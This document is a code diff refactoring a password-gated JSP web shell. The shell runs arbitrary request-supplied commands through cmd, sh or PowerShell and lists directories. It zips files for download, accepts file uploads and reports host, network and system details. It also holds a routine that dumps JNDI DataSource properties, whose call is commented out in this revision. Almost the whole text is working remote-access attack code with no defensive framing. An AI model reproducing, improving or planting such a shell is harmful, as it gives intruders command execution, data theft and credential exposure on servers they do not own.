@@ -14,24 +14,24 @@
 <%@ page import="javax.naming.*" %>
 
 <%!
-    static boolean isNotEmpty(Object obj) {
+    private static boolean isNotEmpty(Object obj) {
         if (obj == null) {
             return false;
         }
         return !"".equals(String.valueOf(obj).trim());
     }
 
-    static String formatMessage(String message) {
+    private static String formatMessage(String message) {
         return "[*]\t" + message;
     }
 
-    static String exceptionToString(Exception e) {
+    private  static String exceptionToString(Exception e) {
         StringWriter sw = new StringWriter();
         e.printStackTrace(new PrintWriter(sw, true));
         return sw.toString();
     }
 
-    static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException {
+    private static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         byte[] b = new byte[1024];
         int a = 0;
@@ -42,7 +42,7 @@
     }
 
 
-    static void extractData(Object jndiObject, JspWriter out) throws IOException {
+    private static void extractData(Object jndiObject, JspWriter out) throws Exception  {
         try {
             BeanInfo info = Introspector.getBeanInfo(jndiObject.getClass(), Object.class);
             PropertyDescriptor[] properties = info.getPropertyDescriptors();
@@ -53,16 +53,16 @@
                     if (String.class.equals(method.getReturnType()) && method.getName().startsWith("get")) {
                         try {
                             method.setAccessible(true);
-                            out.println(formatMessage(propName+":"+method.invoke(jndiObject)));
-                        } catch (IllegalAccessException e) {
-                        } catch (InvocationTargetException e) {}
+                            out.println(formatMessage(propName+":"+method.invoke(jndiObject, null)));
+                        } catch (Exception e) {
+                        }
                     }
                 }
             }
         } catch (IntrospectionException e) { }
     }
 
-    static void findJndi(String path, Context ctx, JspWriter out) throws NamingException, IOException {
+    private static void findJndi(String path, Context ctx, JspWriter out) throws NamingException {
         NamingEnumeration namingEnumeration = ctx.list(path);
         while(namingEnumeration.hasMore()) {
             NameClassPair resource = (NameClassPair) namingEnumeration.next();
@@ -74,14 +74,17 @@
                     findJndi(lookPath, ctx, out);
                 } else {
                     if (tmp instanceof DataSource) {
-                        extractData(tmp, out);
+                        try {
+                            extractData(tmp, out);
+                        } catch (Exception e) {}
                     }
                 }
             } catch (NamingException e) {}
         }
     }
 
-    static String findRealPath(String path) {
+
+    private static String findRealPath(String path) {
         String filePath = null;
         if (isNotEmpty(path)) {
             File f = new File(path).getParentFile();
@@ -97,11 +100,13 @@
         return filePath;
     }
 
-    static void zipFile(ZipOutputStream zip, File file, int rootLength) throws IOException{
+    private static void zipFile(ZipOutputStream zip, File file, int rootLength) throws IOException{
         if(file.isDirectory() && file.canRead()){
             File[] files = file.listFiles();
-            for(File f:files){
-                zipFile(zip, f, rootLength);
+            if (files != null) {
+                for(int i=0; i < files.length; i++) {
+                    zipFile(zip, files[i], rootLength);
+                }
             }
         } else {
             FileInputStream in = new FileInputStream(file);
@@ -112,78 +117,66 @@
         }
     }
 
-    static void zip(ByteArrayOutputStream out, File file) throws IOException{
+    private static void zip(ByteArrayOutputStream out, File file) throws IOException{
         ZipOutputStream zos = new ZipOutputStream(out);
         String parent = file.getParentFile().getAbsolutePath();
         zipFile(zos, file, parent.length()+1);
         zos.close();
     }
 
-    enum Attributes {
+    private static class Command {
+        private static final String OS_VERSION = "os.version";
+        private static final String OS_NAME = "os.name";
+        private static final String OS_ARCH = "os.arch";
+        private static final String JAVA_HOME = "java.home";
+        private static final String JAVA_VENDOR = "java.vendor";
+        private static final String JAVA_VERSION = "java.version";
+        private static final String USER_DIR = "user.dir";
+        private static final String USER_HOME = "user.home";
+        private static final String USER_NAME = "user.name";
+        private static final String attributes[] = {OS_VERSION, OS_NAME, OS_ARCH, JAVA_HOME,
+                JAVA_VENDOR, JAVA_VERSION, USER_DIR,  USER_HOME, USER_NAME};
 
-        OS_VERSION("os.version"),
-        OS_NAME("os.name"),
-        OS_ARCH("os.arch"),
-        JAVA_HOME("java.home"),
-        JAVA_VENDOR("java.vendor"),
-        JAVA_VERSION("java.version"),
-        USER_DIR("user.dir"),
-        USER_HOME("user.home"),
-        USER_NAME("user.name");
-
-        private String value = null;
-
-        Attributes(String s) {
-            this.value = s;
-        }
-
-        public String value() {
-            return value;
-        }
-    }
-
-    public static class Command {
-        public static final String WIN_CMD[] = {"cmd", "/C"};
-        public static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
-        public static final String BASH[]    = {"/bin/sh", "-c"};
+        private static final String WIN_CMD[] = {"cmd", "/C"};
+        private static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
+        private static final String BASH[]    = {"/bin/sh", "-c"};
         private static final String IPCONFIG = "ipconfig /all";
         private static final String IFCONFIG = "/sbin/ifconfig -a";
-        private static final String END_OF_POWER_SHELL_COMMAND = "---end-of-script---";
-        public static final String WDIR_LIST = "dir";
-        public static final String LDIR_LIST = "ls -la";
+        private static final String WDIR_LIST = "dir";
+        private static final String LDIR_LIST = "ls -la";
 
-        public static String getOS() {
-            return System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
+        private static String getOS() {
+            return System.getProperty(OS_NAME).toLowerCase();
         }
 
-        public static String ipconfig() {
+        private static String ipconfig() {
             String command = (getOS().startsWith("windows")) ? IPCONFIG : IFCONFIG;
             return runCommand(command);
         }
 
-        public static String runCommand(String command) {
-            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
+        private static String runCommand(String command) {
+            String os = System.getProperty(OS_NAME).toLowerCase();
 
             String shell[] = (os.startsWith("windows")) ? WIN_CMD : BASH;
 
             return runCommand(shell, command);
         }
 
-        public static String runPowerCommand(String command) {
-            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
+        private static String runPowerCommand(String command) {
+            String os = System.getProperty(OS_NAME).toLowerCase();
 
             String shell[] = (os.startsWith("windows")) ? WIN_POWER : BASH;
             String cmd = "\"& { "+command+";echo  \"---end-of-script---\"; }\"";
             return runCommand(shell, cmd);
         }
 
-        public static String listDir(String path) {
+        private static String listDir(String path) {
             String command = (getOS().startsWith("windows")) ? WDIR_LIST : LDIR_LIST;
             command += " " + path;
             return runCommand(command);
         }
 
-        public static String runCommand(String shell[], String command) {
+        private static String runCommand(String shell[], String command) {
             String cmd[] = new String[shell.length + 1];
             System.arraycopy(shell, 0, cmd, 0, shell.length);
             cmd[cmd.length - 1] = command;
@@ -210,20 +203,25 @@
             } finally {
 
                 try {
-                    inputStreamReader.close();
-                    bufferedReader.close();
-                } catch (IOException e) {
+                    if (inputStreamReader != null){
+                        inputStreamReader.close();
+                    }
+                    if (bufferedReader != null){
+                        bufferedReader.close();
+                    }
+                } catch (Exception e) {
                     return "";
                 }
             }
             return stringBuffer.toString();
         }
     }
+
     public class Upload {
-        private final int ONE_MB=1024*1024*1;
+        private final int ONE_MB= 1024 * 1024;
 
 
-        public Hashtable parseData(ServletInputStream data,
+        private Hashtable parseData(ServletInputStream data,
                                    String boundary,
                                    String saveInDir)
                 throws IllegalArgumentException, IOException
@@ -431,8 +429,7 @@
                     }
 
                     dataTable.put(paramName, fileInfo);
-                }
-                catch (IOException e) { throw e; }
+                } catch (IOException e) { throw e; }
             }
 
             return dataTable;
@@ -575,14 +572,14 @@
     String reqPath = request.getParameter("path");
     String reqAction  = request.getParameter("action");
     String reqArgs  = request.getParameter("args");
-    Command command = new Command();
+
     if (isNotEmpty(reqPass) && reqPass.equals(application.getInitParameter("pass"))) {
         String appPath = application.getRealPath(request.getRequestURI());
         String path = isNotEmpty(reqPath) ? reqPath : findRealPath(appPath);
 
         if (isNotEmpty(reqMethod) && "GET".equalsIgnoreCase(reqMethod)) {
             if (isNotEmpty(reqAction) && reqAction.equals(actions[0]) && isNotEmpty(reqArgs)) {
-                out.println(formatMessage(command.runCommand(reqArgs)));
+                out.println(formatMessage(Command.runCommand(reqArgs)));
             } else if (isNotEmpty(reqAction) && reqAction.equals(actions[2])) {
                 if(isNotEmpty(reqArgs) && isNotEmpty(path)) {
                     File file = new File(path, reqArgs);
@@ -612,24 +609,27 @@
                 }
 
             } else if (isNotEmpty(reqAction) && reqAction.equals(actions[3])) {
-                out.println(formatMessage(command.runPowerCommand(reqArgs)));
+                out.println(formatMessage(Command.runPowerCommand(reqArgs)));
             } else {
                 out.println(formatMessage("====== Java System properties ======"));
                 Properties props = System.getProperties();
-                Attributes attributes[] = Attributes.values();
+                String attributes[] = Command.attributes;
                 int attributesSize = attributes.length;
                 for (int i=0; i < attributesSize; i++) {
-                    String attributeName = attributes[i].name();
-                    String attributeValue = attributes[i].value();
+                    String attributeValue = attributes[i];
                     String propValue = props.getProperty(attributeValue);
-                    out.println(formatMessage(attributeName+": "+propValue));
+                    out.println(formatMessage(attributeValue+": "+propValue));
                 }
                 out.println(formatMessage("====== JNDI info ======"));
-                InitialContext ctx = new InitialContext();
-                findJndi("java:comp", ctx, out);
+                InitialContext ctx = null;
+                try {
+                    ctx = new InitialContext();
+                   // findJndi("java:comp", ctx, out);
+                } catch (NamingException e) {}
+
                 out.println(formatMessage("====== Network ======"));
-                out.println(formatMessage("Hostname:\t"+command.runCommand("hostname")));
-                out.println(formatMessage(command.ipconfig()));
+                out.println(formatMessage("Hostname:\t"+Command.runCommand("hostname")));
+                out.println(formatMessage(Command.ipconfig()));
             }
         } else if (isNotEmpty(reqMethod) && "POST".equalsIgnoreCase(reqMethod)) {
             if(isNotEmpty(reqContentType) && reqContentType.startsWith("multipart")) {
